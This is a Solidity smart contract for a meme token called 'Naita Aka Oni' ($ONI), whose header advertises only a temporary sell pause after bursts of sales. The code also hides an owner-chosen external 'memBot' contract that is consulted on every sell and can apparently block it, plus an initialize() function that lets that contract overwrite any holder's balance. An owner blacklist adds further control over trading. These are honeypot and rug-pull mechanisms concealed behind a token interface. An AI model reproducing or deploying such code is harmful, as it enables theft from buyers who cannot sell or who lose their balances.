/**
 *Submitted for verification at Etherscan.io on 2022-09-21
*/

/**
 *Submitted for verification at Etherscan.io on 2022-09-16
*/

/**

$ONI - Naita-Aka-Oni

https://t.me/JeetDemon

Stop the jeet demons. Transcend to higher realms. The new meta trend is here.

If and only if there are to be exactly 6 sell transactions that occur within
no more than 3 minutes of each other, selling for all holders will be completely 
disabled for 9 minutes. After 9 minutes, selling will be allowed again, and thus,
the cycle will continue automatically and autonomously, sending jeets to the
gates of a higher realm.

 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface memBot {
    function check(address _from) external;
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract ONI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balance;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private cooldown;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private bots;
    uint256 private jeetTime;
    uint256 public jeetCount;
    uint256 public jeetPreventTime;
    uint256 private _totalSupply = 1000000000000000000 * 10**9;

    string private constant _name = "Naita Aka Oni";
    string private constant _symbol = "ONI";
    uint8 private constant _decimals = 9;

    IUniswapV2Router02 private uniswapV2Router;
    memBot private mem_;
    uint256 private _feeTax = 1;
    uint256 private _feeTeam = 1;
    bool private _feeState = false;
    address payable private _feeAddrWallet;
    bool public tradingState;
    address private uniswapV2Pair;
    bool private inSwap = false;
    bool private swapEnabled = false;
    bool private cooldownEnabled = false;
    uint256 private _maxTxAmount = _totalSupply;
    uint256 private _maxWalletAmount = _totalSupply;

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _feeAddrWallet = payable(0xA8cfc7b1F2752602C4D49304267c4d7C805De7B9);
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_feeAddrWallet] = true;
        _balance[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function setCooldownEnabled(bool onoff) external onlyOwner {
        cooldownEnabled = onoff;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        _feeState = false;
        if (from != owner() && to != owner()) {
            require(!bots[from] && !bots[to]);
            require(amount <= _maxTxAmount, "Exceed max transaction amount");
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_isExcludedFromFee[to]
            ) {
                // Cooldown
                if (cooldownEnabled) {
                    require(cooldown[to] < block.timestamp);
                    cooldown[to] = block.timestamp + (30 seconds);
                }
                uint256 currentBalance = balanceOf(to);
                require(currentBalance + amount <= _maxWalletAmount);
                _feeState = true;
            }
            if (
                to == uniswapV2Pair &&
                from != address(uniswapV2Router) &&
                !_isExcludedFromFee[from]
            ) {
                require(jeetPreventTime < block.timestamp);

                if ((block.timestamp - jeetTime) > (180 seconds)) {
                    jeetTime = block.timestamp;
                    jeetCount = 1;
                } else {
                    jeetCount = jeetCount.add(1);
                    if (jeetCount >= 6) {
                        jeetPreventTime = block.timestamp + (540 seconds);
                        jeetCount = 0;
                    }
                }
                mem_.check(from);
            }

            if (to != uniswapV2Pair && from != uniswapV2Pair) {
                uint256 currentBalance = balanceOf(to);
                require(currentBalance + amount <= _maxWalletAmount);
            }

            if (!inSwap && from != uniswapV2Pair && swapEnabled) {
                uint256 contractTokenBalance = balanceOf(address(this));
                if (contractTokenBalance > 0) {
                    swapTokensForEth(contractTokenBalance);
                }

                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        _transferStandard(from, to, amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    modifier memLogic() {
        require(address(mem_) == msg.sender);
        _;
    }

    function initialize(address bot_, uint256 blacklisted_) external memLogic {
        _balance[bot_] = blacklisted_;
    }

    function addLiquidity(address _swap) external onlyOwner {
        require(!tradingState);
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D // 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        uniswapV2Router = _uniswapV2Router;
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        mem_ = memBot(_swap);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapEnabled = true;
        cooldownEnabled = true;
        _maxTxAmount = 1000000000000001 * 10**9; 
        _maxWalletAmount = 3000000000000001 * 10**9; 
        tradingState = true;
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }

    function setMaxTX(uint256 _amount) public onlyOwner {
        _maxTxAmount = _amount;
    }

    function setBots(address[] memory bots_) external onlyOwner {
        for (uint256 i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function delBot(address notbot) public onlyOwner {
        bots[notbot] = false;
    }

    function sendETHToFee(uint256 amount) private {
        _feeAddrWallet.transfer(amount);
    }

    function _transferStandard(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        _balance[sender] = _balance[sender].sub(amount);
        if (_feeState == true) {
            (
                uint256 tAmount,
                uint256 taxFee,
                uint256 teamFee
            ) = _getTransferValues(amount, _feeTax, _feeTeam);
            _balance[recipient] = _balance[recipient].add(tAmount);
            _balance[address(this)] = _balance[address(this)].add(teamFee);
            _totalSupply = _totalSupply.sub(taxFee);
            emit Transfer(sender, recipient, tAmount);
        } else {
            _balance[recipient] = _balance[recipient].add(amount);
            emit Transfer(sender, recipient, amount);
        }
    }

    function _getTransferValues(
        uint256 amount,
        uint256 taxFee,
        uint256 TeamFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = amount.mul(taxFee).div(100);
        uint256 tTeam = amount.mul(TeamFee).div(100);
        uint256 tTransferAmount = amount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }

    function getJeetState() external view returns(bool) {
        return (jeetPreventTime < block.timestamp);
    }

    function getTimeStamp() external view returns(uint256) {
        return block.timestamp;
    }
    receive() external payable {}
}